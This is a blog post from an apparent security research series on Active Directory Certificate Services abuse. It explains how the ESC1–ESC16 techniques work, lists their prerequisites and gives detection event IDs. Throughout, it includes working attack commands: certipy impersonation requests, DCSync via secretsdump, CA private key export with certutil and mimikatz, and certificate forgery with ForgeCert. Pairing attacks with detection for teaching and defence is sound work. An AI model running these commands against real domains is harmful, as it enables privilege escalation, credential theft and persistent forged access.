---
title: "AD CS Abuse Research, Part 5: OID and Issuance Policy Abuse, and the Complete ESC Reference"
date: 2026-06-10
categories: [Personal]
tags: [Windows, Active Directory, ADCS, Certificates, Privilege Escalation, Research]
published: true
---

This post covers ESC13 and ESC15 as full deep dives, then provides a consolidated reference for the remaining ESC techniques across the full taxonomy. The goal is for this post alongside the rest of the series to serve as a unified reference for AD CS abuse without needing to go elsewhere.

---

## Table of Contents

1. [OID Objects and Issuance Policies in AD CS](#1-oid-objects-and-issuance-policies-in-ad-cs)
2. [ESC13: OID Group Link Abuse](#2-esc13-oid-group-link-abuse)
3. [ESC15: Application Policy Substitution (EKUwu)](#3-esc15-application-policy-substitution-ekuwu)
4. [OPSEC Profile: ESC13 and ESC15](#4-opsec-profile-esc13-and-esc15)
5. [Remaining ESC Reference](#5-remaining-esc-reference)
6. [Complete ESC Taxonomy Table](#6-complete-esc-taxonomy-table)

---

## 1. OID Objects and Issuance Policies in AD CS

Before covering ESC13, it is worth understanding what OID objects are and why they exist in AD, since this is infrastructure most practitioners have never had reason to interact with.

### What OIDs Are

An Object Identifier is a globally unique dotted-decimal string used throughout PKI to identify certificate extensions, EKUs, algorithms, and policies. Every named concept in the certificate world has an OID; Client Authentication is `1.3.6.1.5.5.7.3.2`, Smart Card Logon is `1.3.6.1.4.1.311.20.2.2`, and so on. OIDs are hierarchical and assigned by standards bodies or vendors.

In AD CS, **issuance policies** are a specific use of OIDs. An issuance policy OID embedded in a certificate's Certificate Policies extension signals that the certificate was issued under a particular policy, for example that the certificate was issued only after the holder's identity was verified in person. They are used in environments that need to make policy-based access decisions on certificate attributes.

### Where OID Objects Live in AD

AD CS stores issuance policy definitions as objects in the directory at:

```
CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com
```

Each object in this container represents one issuance policy. The attributes that matter for ESC13:

- `msPKI-Cert-Template-OID`: the OID string value this object represents
- `msDS-OIDToGroupLink`: a DN reference pointing to a security group in AD

The `msDS-OIDToGroupLink` attribute is the attack surface. It was introduced to support a feature called "authentication mechanism assurance": if a certificate was issued under a strong assurance policy, the holder's TGT should automatically include membership in a high-assurance group, granting access to resources that require that level of assurance. The KDC reads this linkage at PKINIT time and injects the linked group's SID into the PAC.

### How Templates Reference Issuance Policies

A certificate template references an issuance policy via its `msPKI-Certificate-Policy` attribute, which contains the OID string of the issuance policy the template is associated with. The full chain is:

```
Certificate template
  └─ msPKI-Certificate-Policy: <OID string>
      └─ OID object (CN=OID,...)
          └─ msDS-OIDToGroupLink: <DN of security group>
              └─ Security group (e.g. Domain Admins)
```

When a user enrolls a cert from the template, the OID is embedded in the issued certificate's Certificate Policies extension. When that cert is used for PKINIT, the KDC finds the OID object, reads `msDS-OIDToGroupLink`, and adds the linked group's SID to the user's PAC. The user's TGT reflects membership in that group for the duration of the ticket.

---

## 2. ESC13: OID Group Link Abuse

### Vulnerability Class

ESC13 is an issuance policy misconfiguration. A certificate template's associated issuance policy OID is linked to a privileged security group via `msDS-OIDToGroupLink`. Any principal who can enroll a certificate from that template receives a TGT with the linked group's SID in the PAC, gaining the group's effective rights without becoming an actual member of the group in AD.

The misconfiguration can arise in two ways. The first is a deliberately configured authentication mechanism assurance setup where the linked group is more privileged than intended or the template enrollment rights are too broad. The second, and more interesting from an attacker's perspective, is that write access to either the OID object's `msDS-OIDToGroupLink` attribute or the template's `msPKI-Certificate-Policy` attribute allows an attacker to introduce the linkage themselves, an AD object write primitive similar in spirit to ESC4 and ESC14.

### Prerequisites

For the direct exploitation path (linkage already exists):

1. A certificate template has `msPKI-Certificate-Policy` set to an OID whose corresponding OID object has `msDS-OIDToGroupLink` pointing to a privileged group
2. The template is enrollable by the attacker's account
3. The template has an auth-enabling EKU (Client Authentication, Smart Card Logon, or equivalent)

For the write-based path (attacker introduces the linkage):

1. Write access to `msDS-OIDToGroupLink` on an OID object, or write access to `msPKI-Certificate-Policy` on a template
2. An enrollable template with an auth EKU whose OID object the attacker can modify
3. A target privileged group whose SID the attacker wants injected into their PAC

### Why Existing Tooling Misses This

Certipy's `find` command enumerates template attributes but does not correlate the three-object chain. It surfaces the template's `msPKI-Certificate-Policy` value as a raw OID string but does not follow that OID to the corresponding OID object in `CN=OID,...` and then check for `msDS-OIDToGroupLink`. This correlation gap means ESC13 conditions are present in environments that Certipy reports as clean.

### Attack Chain: Direct Exploitation

**Step 1: Enumerate templates with issuance policy OIDs linked to privileged groups**

This requires reading both the template objects and the OID objects and correlating them. No existing tool does this automatically; manual LDAP queries are required.

```bash
# Read all OID objects with msDS-OIDToGroupLink set
ldapsearch -H ldap://<dc-ip> -x -D 'domain\attacker' -w Password1 \
  -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' \
  '(msDS-OIDToGroupLink=*)' msPKI-Cert-Template-OID msDS-OIDToGroupLink

# Then cross-reference with template msPKI-Certificate-Policy values
ldapsearch -H ldap://<dc-ip> -x -D 'domain\attacker' -w Password1 \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' \
  '(msPKI-Certificate-Policy=*)' cn msPKI-Certificate-Policy nTSecurityDescriptor
```

**Step 2: Confirm the linked group is privileged and the template is enrollable**

Check the group DN from `msDS-OIDToGroupLink` against known privileged groups (Domain Admins, Enterprise Admins, groups with DCSync rights, etc.). Confirm the template's `nTSecurityDescriptor` grants the attacker's account `Certificate-Enrollment`.

**Step 3: Enroll a certificate from the linked template**

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'LinkedTemplate' \
  -dc-ip 10.10.10.10
```

The issued certificate will contain the issuance policy OID in its Certificate Policies extension.

**Step 4: Authenticate via PKINIT**

```bash
certipy auth -pfx attacker.pfx -dc-ip 10.10.10.10
```

The KDC processes the PKINIT request, finds the OID in the certificate, looks up the OID object, reads `msDS-OIDToGroupLink`, and issues a TGT with the linked group's SID injected into the PAC. The attacker now holds a TGT reflecting membership in the privileged group.

**Step 5: Verify PAC contents**

The injected group SID is in the TGT's PAC but is not visible in normal `klist` output. It is reflected in access decisions; attempting to access a resource that requires the linked group will succeed. For DCSync specifically, if the linked group has replication rights:

```bash
export KRB5CCNAME=attacker.ccache
impacket-secretsdump -k -no-pass dc.domain.com -just-dc-ntlm
```

### Attack Chain: Write-Based Path

If the attacker has write access to an OID object's `msDS-OIDToGroupLink` attribute:

**Step 1: Identify a writable OID object linked to an enrollable template**

```bash
# Check nTSecurityDescriptor on OID objects for write ACEs
# GenericWrite or WriteProperty on msDS-OIDToGroupLink is sufficient
```

**Step 2: Write msDS-OIDToGroupLink pointing to a privileged group**

```python
# ldap3
conn.modify(
    oid_object_dn,
    {'msDS-OIDToGroupLink': [(MODIFY_REPLACE, [privileged_group_dn])]}
)
```

**Step 3: Enroll and authenticate as in the direct path above**

**Step 4: Remove the link after obtaining the TGT**

```python
conn.modify(
    oid_object_dn,
    {'msDS-OIDToGroupLink': [(MODIFY_DELETE, [privileged_group_dn])]}
)
```

### Important Constraint

The linked group must not be marked as a Protected Group and must not have the `adminCount` attribute set to `1` for the `msDS-OIDToGroupLink` mechanism to function. Domain Admins has `adminCount=1` which means the KDC will not inject its SID via this mechanism. The practical targets are groups that have been granted specific high-value rights (DCSync, GenericAll on sensitive objects, membership in other privileged groups) without being in the default protected groups list. This is a real constraint that limits but does not eliminate the attack surface; BloodHound is the right tool for identifying which non-protected groups have paths to DA equivalent rights.

---

## 3. ESC15: Application Policy Substitution (EKUwu)

### Vulnerability Class

ESC15, also known as EKUwu, is an application policy substitution attack. It abuses the distinction between Extended Key Usage (EKU) extensions and Application Policy extensions in a certificate, exploiting a condition where a template allows enrollee-supplied content and the CA processes application policies differently from EKUs when validating the request.

The vulnerability was documented by researchers as "EKUwu" and targets the `msPKI-RA-Application-Policies` attribute on certificate templates combined with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag.

### Background: EKU vs Application Policy

A standard certificate has an Extended Key Usage extension that lists the OIDs defining what the certificate can be used for. The CA enforces this based on the template's `pKIExtendedKeyUsage` attribute; only OIDs listed in the template are embedded in the issued certificate.

Application policies (also called enhanced key usage in some contexts) are a parallel extension. In Windows certificate handling, application policies can in some configurations override or supplement EKU restrictions. The `msPKI-RA-Application-Policies` attribute on a template defines application policy constraints for enrollment agent scenarios.

### The Exploitation Condition

ESC15 applies when a template meets all of the following:

1. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set (`mspki-certificate-name-flag & 0x1`), meaning the enrollee controls subject and SAN content
2. The template's schema version is 1 (older templates use schema version 1, which has less strict policy enforcement)
3. The template is enrollable by a low-privilege principal
4. The CA processes the `szOID_APPLICATION_CERT_POLICIES` extension from the CSR without fully validating it against the template's defined application policies

Under these conditions, an attacker can include a `szOID_APPLICATION_CERT_POLICIES` extension in the CSR specifying the Client Authentication OID, even if the template's EKU does not include it. The CA embeds the attacker-supplied application policy in the issued certificate, and Windows certificate validation logic in some contexts treats the application policy as equivalent to the EKU for authentication purposes.

### Prerequisites

1. A version 1 schema template with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set
2. The template is enrollable by the attacker
3. The CA does not strictly enforce application policy content from the CSR against the template definition
4. A Windows authentication context that evaluates application policies for authentication (not all do)

### Attack Chain

**Step 1: Identify version 1 templates with enrollee-supplied subject**

```bash
certipy find -u attacker@domain.com -p Password1 -dc-ip 10.10.10.10
# Look for templates with msPKI-Template-Schema-Version: 1
# and CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set
```

**Step 2: Craft a CSR with an application policy extension specifying Client Authentication**

The CSR must include a `szOID_APPLICATION_CERT_POLICIES` (`1.3.6.1.4.1.311.21.10`) extension containing the Client Authentication OID (`1.3.6.1.5.5.7.3.2`) and the target principal's UPN in the SAN.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'Version1Template' \
  -upn administrator@domain.com \
  -application-policies '1.3.6.1.5.5.7.3.2' \
  -dc-ip 10.10.10.10
```

**Step 3: Authenticate using the issued certificate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Whether authentication succeeds depends on whether the KDC and the authentication stack accept the application policy as equivalent to the EKU. This is environment and configuration dependent; ESC15 is less universally exploitable than ESC1 or ESC9 and requires validation against the specific target environment.

### Relationship to ESC1

ESC15 requires the same base condition as ESC1: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on a template with enrollment rights for low-privilege principals. The difference is the EKU bypass mechanism: ESC1 requires the template to already have an auth EKU, while ESC15 attempts to inject one via the application policy extension. In environments where ESC1 conditions exist, ESC1 is the cleaner path. ESC15 becomes relevant when a template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` but lacks an auth EKU, a condition that would not be flagged as ESC1 by existing tooling but may still be exploitable via the application policy substitution path.

---

## 4. OPSEC Profile: ESC13 and ESC15

### ESC13 Event Signature

**Event ID 4886 (Certificate Issued)** on the CA: the certificate issuance for ESC13 appears entirely normal. The template name, requester, and issued cert content all look legitimate. The only indicator at the CA level is the presence of the issuance policy OID in the certificate's Certificate Policies extension, which is the intended behavior for templates configured with issuance policies.

**Event ID 4768 (Kerberos TGT Request)** on the DC: the PKINIT authentication event. Pre-Authentication Type 17. In an environment without authentication mechanism assurance deployed legitimately, a TGT request that results in a PAC containing a group SID not reflected in the user's actual group membership is anomalous, but detecting this requires PAC content inspection, which is not a standard out-of-the-box detection.

**Event ID 5136 (Directory Service Object Modified)** on the DC: for the write-based ESC13 path, modifying `msDS-OIDToGroupLink` on an OID object generates a 5136 event if Directory Service Change auditing is enabled. The object DN under `CN=OID,...` is unusual enough that any modification should be treated as high priority.

**The stealth advantage of ESC13**: the enrolled certificate contains the issuance policy OID as a legitimate certificate extension. The TGT reflects group membership via PAC injection rather than via actual group membership changes in AD. There is no 4728 (group member added) event, no modification to the group object, and no change to the user's `memberOf` attribute. Traditional group membership monitoring will not catch the privilege escalation. This is one of the more forensically clean escalation paths in the full ESC taxonomy.

### ESC15 Event Signature

**Event ID 4886 (Certificate Issued)** on the CA: the issued certificate will contain an application policy extension with the Client Authentication OID. In an environment where templates are not expected to produce certificates with application policies specifying Client Authentication, this is detectable via CA database inspection but not via standard real-time alerting.

**Event ID 4768** on the DC: standard PKINIT event. Pre-Authentication Type 17. Same profile as other cert-based auth events.

The stealth profile of ESC15 is similar to ESC1 at the authentication layer. The distinction is in the certificate content: an application policy carrying Client Authentication rather than a standard EKU carrying it. Defenders with deep CA database forensics or certificate content inspection in their detection stack may catch this.

### Noise Profile

| Activity | Event | Location | Default Enabled |
|---|---|---|---|
| OID object msDS-OIDToGroupLink write | 5136 | DC Security Log | No |
| Certificate issued (ESC13/ESC15) | 4886 | CA Security Log | Only if CA audit enabled |
| PKINIT TGT request | 4768 (PreAuth=17) | DC Security Log | Yes |
| PAC group injection (ESC13) | No dedicated event | N/A | Not detectable via standard events |

---

## 5. Remaining ESC Reference

The following ESCs are covered at reference depth, sufficient to understand the vulnerability class, prerequisites, attack path, and chaining potential without the full step-by-step treatment given to the primary research targets in earlier parts of this series.

---

### ESC1: Enrollee-Supplied Subject Alternative Name

**Vulnerability class**: template misconfiguration.

**Description**: the template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set in `mspki-certificate-name-flag`, an auth-enabling EKU, and is enrollable by a low-privilege principal. The CA accepts the Subject and SAN directly from the CSR without validating that the requester is entitled to the identity being claimed. An attacker can request a certificate naming any principal in the SAN UPN field and use it for PKINIT. This is the most commonly found ESC in real environments because the flag is required for certain legitimate use cases such as web server certificates where the admin supplies the FQDN, and it is often left enabled on templates that also have auth EKUs without the risk being recognized.

**Prerequisites**: enrollable template with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and an auth EKU (Client Authentication, Smart Card Logon, or Any Purpose). No manager approval required (`CT_FLAG_PEND_ALL_REQUESTS` must not be set, or ESC7 is needed to approve). Both the template and the CA enrollment permissions must allow the attacker's account.

**Attack path**: enroll certificate with target UPN in SAN, authenticate via PKINIT.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'VulnerableTemplate' \
  -upn administrator@domain.com -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

**Detection**: Event ID 4886 on the CA will show the issued certificate. The SAN UPN in the issued cert will not match the requester's identity; `administrator@domain.com` issued to `attacker@domain.com`. CA database forensics comparing requester identity against SAN content is the primary detection method. Real-time detection requires CA audit logging and a rule that flags SAN UPN mismatches against the requester identity.

**Chains with**: ESC4 (write template to introduce ESC1 conditions), ESC6/ESC7 (CA-level SAN flag enables ESC1 on all templates), ESC9 (add `CT_FLAG_NO_SECURITY_EXTENSION` to bypass strong mapping in enforcement environments).

**Tooling**: Certipy, Certify. Well covered.

---

### ESC2: Any Purpose EKU

**Vulnerability class**: template misconfiguration.

**Description**: the template has the Any Purpose OID (`2.5.29.37.0`) in `pKIExtendedKeyUsage`, or has no EKU at all. Both conditions produce a certificate that Windows treats as valid for every use, including Kerberos authentication. The Any Purpose OID was designed for testing and development templates and is rarely appropriate for production use. A template with no EKU at all is similarly treated as unconstrained by the certificate validation stack. Combined with enrollee-supplied SAN conditions, this is functionally equivalent to ESC1. Without enrollee-supplied SAN, the certificate cannot be used to directly impersonate another principal but can be used as an enrollment agent credential to request certificates on behalf of others via a second template.

**Prerequisites**: enrollable template with Any Purpose EKU or no EKU. If `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is also set, direct impersonation is possible. If not, the certificate is still usable as an enrollment agent provided a second template with `mspki-ra-signature = 0` exists.

**Attack path**: if SAN flags permit, same as ESC1. If not, use the issued Any Purpose cert as an enrollment agent certificate to abuse ESC3.

```bash
# Obtain the Any Purpose cert for the attacker's own account
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'AnyPurposeTemplate' -dc-ip 10.10.10.10

# Use as enrollment agent (ESC3 path)
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'TargetTemplate' \
  -on-behalf-of 'domain\administrator' \
  -pfx attacker.pfx -dc-ip 10.10.10.10
```

**Detection**: Event ID 4886 on the CA. In the ESC3 variant, two 4886 events fire: one for the Any Purpose cert enrollment and one for the on-behalf-of enrollment. The second event's requester and subject will differ, which is the key indicator.

**Chains with**: ESC3 (Any Purpose cert used as enrollment agent), ESC1 conditions if SAN flags are also present.

**Tooling**: Certipy. Well covered.

---

### ESC3: Enrollment Agent Abuse

**Vulnerability class**: template misconfiguration.

**Description**: a two-stage abuse. Stage one: enroll a certificate from a template with the Certificate Request Agent OID (`1.3.6.1.4.1.311.20.2.1`) to obtain an enrollment agent certificate. Stage two: use that enrollment agent certificate to request certificates on behalf of other principals from a second template that does not require RA counter-signatures (`mspki-ra-signature = 0`). The CA accepts the enrollment agent's counter-signature as authorization to issue a certificate naming any principal in the on-behalf-of field.

The enrollment agent mechanism was designed to support scenarios like helpdesk staff enrolling smart card certificates on behalf of users. The misconfiguration is when the enrollment agent template is enrollable by non-privileged principals, or when the target template does not restrict which enrollment agents can request from it. The CA has an enrollment agent restrictions list (`msPKI-RA-Certificate` attribute on the CA object) that can limit which enrollment agent certificates are accepted for which templates; when this is not configured, any enrollment agent certificate can be used for any template.

**Prerequisites**: a template enrollable by the attacker with the Certificate Request Agent EKU, and a second template with `mspki-ra-signature = 0` and an auth EKU enrollable by the enrollment agent. The CA's enrollment agent restrictions must not block the attacker's agent cert from requesting against the target template.

**Attack path**: obtain enrollment agent cert from template A, use it to request a cert naming a target principal from template B.

```bash
# Step 1: obtain enrollment agent cert
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'EnrollmentAgentTemplate' -dc-ip 10.10.10.10

# Step 2: request cert on behalf of target
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'TargetTemplate' \
  -on-behalf-of 'domain\administrator' \
  -pfx agent.pfx -dc-ip 10.10.10.10
```

**Detection**: two Event ID 4886 events on the CA. The second event will show the on-behalf-of subject (administrator) while the requester is the attacker's account. This mismatch between requester and issued subject is the primary indicator. CA enrollment agent restriction misconfiguration is also detectable via the `msPKI-RA-Certificate` attribute on the CA object in `CN=Enrollment Services`.

**Chains with**: ESC2 (Any Purpose cert usable as enrollment agent).

**Tooling**: Certipy. Well covered.

---

### ESC6: CA-Level EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability class**: CA misconfiguration.

**Description**: the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set in its policy edit flags. This CA-level flag instructs the CA to accept SAN values from the CSR on every template it serves, regardless of the individual template's `mspki-certificate-name-flag` settings. Every template with an auth EKU published on this CA effectively becomes an ESC1-exploitable template.

The flag is set via `certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA server, typically by administrators who needed to issue certificates with custom SANs for legacy applications and did not realize the security implication. It is stored in the CA's registry-backed configuration and is reflected in the CA object's attributes in `CN=Enrollment Services`, making it detectable via standard LDAP enumeration.

An important nuance: even a template that has `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` set (which normally forces the SAN to be built from the requester's AD UPN rather than the CSR) is overridden by this CA-level flag. The CA-level flag takes precedence over all template-level SAN construction settings.

**Prerequisites**: any enrollable template with an auth EKU on the affected CA. The flag is readable from the CA object in `CN=Enrollment Services` via the `msPKI-Enrollment-Flag` or directly via certutil on the CA.

**Attack path**: enroll any auth-EKU template with a target UPN in the SAN.

```bash
# Verify flag is set
certipy find -u attacker@domain.com -p Password1 -dc-ip 10.10.10.10
# Look for: [!] Enabled EDITF_ATTRIBUTESUBJECTALTNAME2

certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'User' \
  -upn administrator@domain.com -dc-ip 10.10.10.10
```

**Detection**: Event ID 4886 on the CA with SAN/requester mismatch, same as ESC1. Event ID 4898 (CA configuration changed) if the flag was recently set. The flag itself is detectable via LDAP enumeration of the CA object; any security audit of the AD CS configuration should surface it.

**Chains with**: ESC7 (ManageCA can enable this flag), effectively converts every auth-EKU template to ESC1 conditions.

**Tooling**: Certipy. Well covered.

---

### ESC12: Shell Access to CA Server

**Vulnerability class**: CA server compromise.

**Description**: an attacker with shell access (local admin or SYSTEM) on the CA server can extract the CA's private key directly. With the CA private key, the attacker can forge certificates for any principal offline without interacting with the CA service at all. The forged certificates are signed by the legitimate CA key and are indistinguishable from legitimately issued certificates at the cryptographic level; they will pass chain validation on any domain member because the signing key is the real CA key.

This is less a PKI misconfiguration and more a consequence of CA server compromise, but it warrants explicit coverage because the CA server is frequently not treated as a Tier 0 asset in AD environments despite being functionally equivalent to a DC from an impact perspective. An attacker who owns the CA private key has persistent, unrevocable access to domain authentication for as long as the CA certificate is trusted, which is typically years. The only remediation is to revoke the CA certificate itself, republish a new CA, and re-enroll all issued certificates, which is a significant operational undertaking.

The CA private key may be stored in software (in the CA server's machine certificate store, exportable via certutil or mimikatz) or in a hardware security module (HSM). Software storage is the default for most enterprise CA deployments. HSM storage prevents key extraction even with SYSTEM access on the CA server, which is the recommended hardening.

**Prerequisites**: local administrator or SYSTEM access on the CA server. This commonly comes via ESC5 (RBCD to the CA machine account), via lateral movement from a domain admin account, or via direct exploitation of the CA server if it is not kept current on patches.

**Attack path**: extract the CA private key, forge certificates offline.

```bash
# On the CA server via certutil backup
certutil -backupkey C:\backup

# Via mimikatz on the CA server
crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export

# Forge cert offline with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword '' \
  --Subject "CN=Administrator" \
  --SubjectAltName "administrator@domain.com" \
  --NewCertPath admin.pfx --NewCertPassword ''

# Authenticate
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
```

**Detection**: certutil backup operations generate Event ID 4876 (CA backup started) and 4877 (CA backup completed) on the CA if CA audit logging is enabled. Private key export via mimikatz or direct DPAPI operations may generate Event ID 4692 (backup of data protection master key attempted) or Sysmon Event ID 10 (process access) depending on the method used. The forged certificates themselves will not generate any CA-side events since they are created entirely offline.

**Chains with**: ESC5 (RBCD to CA machine account leads directly here).

**Tooling**: ForgeCert, mimikatz, certutil. The extraction and forgery steps are well documented, but automated detection of CA private key extraction in SIEM environments is limited.

---

### ESC16: szOID_NTDS_CA_SECURITY_EXT Suppression (Global CA Flag)

**Vulnerability class**: CA misconfiguration.

**Description**: ESC16 is the CA-level equivalent of ESC9's template-level `CT_FLAG_NO_SECURITY_EXTENSION`. Rather than a per-template flag suppressing `szOID_NTDS_CA_SECURITY_EXT`, a CA-level configuration disables the security extension globally across all templates on the CA. The effect is the same: certificates issued by this CA do not contain the SID-binding extension, forcing the KDC onto weak UPN-based mapping for all PKINIT authentications using those certificates.

The CA-level flag that controls this is `EDITF_DISABLEEXTENSIONLIST` in combination with specific extension suppression configuration, or in some CA versions a direct registry-level configuration that disables the security extension globally. The practical effect is that every certificate issued by this CA is equivalent to having been issued from an ESC9-flagged template, regardless of the individual template's own `mspki-enrollment-flag` settings.

ESC16 is more impactful than ESC9 per finding because a single misconfigured CA-level setting affects every template it serves rather than requiring a per-template misconfiguration. In terms of exploitation, the attack path mirrors ESC9 exactly: obtain GenericWrite over an account to modify its UPN, enroll any suitable template, restore the UPN, authenticate. The only difference is that no specific ESC9-flagged template is required; any auth-EKU template on the affected CA is usable.

**Prerequisites**: the CA has the security extension disabled at the CA configuration level. Combined with any enrollable auth-EKU template and write access to a target account's `userPrincipalName` (or the attacker's own UPN), authentication as an arbitrary principal is possible. Requires the KDC to be in compatibility mode (`StrongCertificateBindingEnforcement = 1`) or disabled mode (`0`); full enforcement mode (`2`) blocks the authentication step regardless of whether the extension is present.

**Attack path**: same as ESC9 but no per-template flag is required; the suppression applies CA-wide. Modify UPN to target, enroll any suitable template on the affected CA, restore UPN, authenticate.

```bash
# Modify UPN to target
certipy account update -u attacker@domain.com -p Password1 \
  -user attacker -upn administrator@domain.com -dc-ip 10.10.10.10

# Enroll any auth-EKU template on the ESC16-affected CA
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'User' -dc-ip 10.10.10.10

# Restore UPN
certipy account update -u attacker@domain.com -p Password1 \
  -user attacker -upn attacker@domain.com -dc-ip 10.10.10.10

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

**Detection**: Event ID 4738 (User Account Changed) on the DC for the UPN modification and restoration, same as ESC9. Event ID 39 (KDC weak mapping fallback) on the DC when the certificate is used for PKINIT in compatibility mode. The CA-level configuration change that introduces ESC16 would generate Event ID 4898 (CA configuration changed) if CA audit logging was enabled at the time of the change. The flag itself is not cleanly surfaced by existing enumeration tools, making it a gap in the current detection and tooling landscape.

**Chains with**: ESC7 (ManageCA can modify CA-level flags to introduce this condition), ESC9/ESC10 mechanics for the authentication step.

**Tooling**: limited. Certipy detects some CA-level flag conditions but ESC16 specifically is not cleanly surfaced by the `find` command. Identifying it requires reading the CA's configuration registry or parsing the CA object attributes carefully. A dedicated enum check for this condition is one of the gaps the tooling project addresses.

---

## 6. Complete ESC Taxonomy Table

The table below maps every ESC covered across this series to its vulnerability class, primary prerequisites, available tooling, and relative OPSEC noise. It is intended as a quick reference and cross-index for the full writeup series.

| ESC | Name | Vulnerability Class | Key Prerequisite | Tooling Coverage | OPSEC Noise |
|---|---|---|---|---|---|
| ESC1 | Enrollee-supplied SAN | Template misconfiguration | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + auth EKU + low-priv enroll | Certipy, Certify | Medium (4886 on CA) |
| ESC2 | Any Purpose EKU | Template misconfiguration | Any Purpose or no EKU + low-priv enroll | Certipy, Certify | Medium |
| ESC3 | Enrollment agent abuse | Template misconfiguration | Enrollment agent EKU + second template with no RA sig | Certipy | Medium (two 4886 events) |
| ESC4 | Template DACL write | AD object write | Write ACE on template object | Certipy | Medium (4899 + 5136 if enabled) |
| ESC5 | PKI object write | AD object write | Write on NTAuthCertificates or CA computer object | Manual / ForgeCert | High (5136 on sensitive object) |
| ESC6 | CA-level SAN flag | CA misconfiguration | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | Certipy | Medium (4898 on CA) |
| ESC7 | CA ACL abuse | AD object write | ManageCA or Manage Certificates ACE | Certipy | Medium (4898 on CA) |
| ESC8 | HTTP relay | Relay | Web Enrollment role + no EPA | ntlmrelayx --adcs | Medium (network + 4886) |
| ESC9 | No security extension (template) | Cert mapping bypass | `CT_FLAG_NO_SECURITY_EXTENSION` + GenericWrite on account | Certipy | Medium (4738 + Event 39) |
| ESC10 | Weak mapping (registry) | Cert mapping bypass | `StrongCertificateBindingEnforcement=0` on DC | Certipy | Medium (4738) |
| ESC11 | MS-ICPR relay | Relay | MS-ICPR accessible + no `IF_ENFORCEENCRYPTICERTREQUEST` | Certipy + Coercer (no unified tool) | Medium (network + 4886) |
| ESC12 | CA server shell access | CA server compromise | Local admin on CA server | ForgeCert, certutil | Low (offline forgery) |
| ESC13 | OID group link abuse | Issuance policy misconfiguration | Template linked OID with `msDS-OIDToGroupLink` to privileged group | No dedicated tooling | Low (no group change events) |
| ESC14 | altSecurityIdentities write | AD object write | GenericWrite on target account object | Certipy | Medium (4738 + 5136 if enabled) |
| ESC15 | Application policy substitution | Template misconfiguration | Version 1 template + `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | Certipy (limited) | Medium (4886) |
| ESC16 | CA-level security extension suppression | CA misconfiguration | CA-level security extension disabled globally | No dedicated tooling | Medium (4898 if CA audit enabled) |

### Tooling Gap Summary

The table makes the tooling gaps explicit. ESC11, ESC13, and ESC16 have no dedicated unified tooling. ESC11 requires combining Certipy and Coercer with no single tool handling the full chain. ESC13 has no enumeration tooling that performs the three-object correlation. ESC16 is not cleanly surfaced by any existing enumeration tool.

These three gaps, alongside the chain-aware enumeration design and measured OPSEC telemetry, define the primary research contributions of the tooling project that follows this series.

---

## References
 
### Primary Research
 
**Certified Pre-Owned: Abusing Active Directory Certificate Services**
Will Schroeder and Lee Christensen, SpecterOps (2021)
The original whitepaper that introduced the ESC taxonomy (ESC1-ESC8), PKI internals analysis, and the foundational research this series builds on.
https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
 
**Certified Pre-Owned (blog post)**
Will Schroeder and Lee Christensen, SpecterOps (2021)
Companion blog post to the whitepaper with a condensed overview.
https://posts.specterops.io/certified-pre-owned-d95910965cd2
 
**Certificates and Pwnage and Patches, Oh My!**
Will Schroeder and Lee Christensen, SpecterOps (2022)
Follow-up post covering KB5014754, strong certificate mapping, and the impact of CVE-2022-26923 on the ESC landscape.
https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
 
**EKUwu: Not Just Another AD CS ESC**
Justin Bollinger, TrustedSec (2024)
Original research disclosing ESC15 (EKUwu / CVE-2024-49019), documenting the application policy substitution vulnerability in version 1 schema templates.
https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
 
---
 
### Tooling Documentation
 
**Certipy Wiki**
ly4k (2024-2025)
Comprehensive documentation covering ESC1-ESC16, exploitation steps, terminology, and detection guidance. The primary reference for current Certipy usage and ESC technique details.
https://github.com/ly4k/Certipy/wiki
 
**Certipy: Privilege Escalation (ESC1-ESC16)**
ly4k
Direct link to the ESC technique breakdown within the Certipy wiki.
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 
**Certipy v5 and ESC16 Release Notes**
ly4k (2025)
Announcement of Certipy v5 introducing ESC13, ESC15, ESC16 support alongside the new wiki.
https://github.com/ly4k/Certipy/discussions/270
 
**Certify Wiki: Escalation Techniques**
GhostPack / SpecterOps
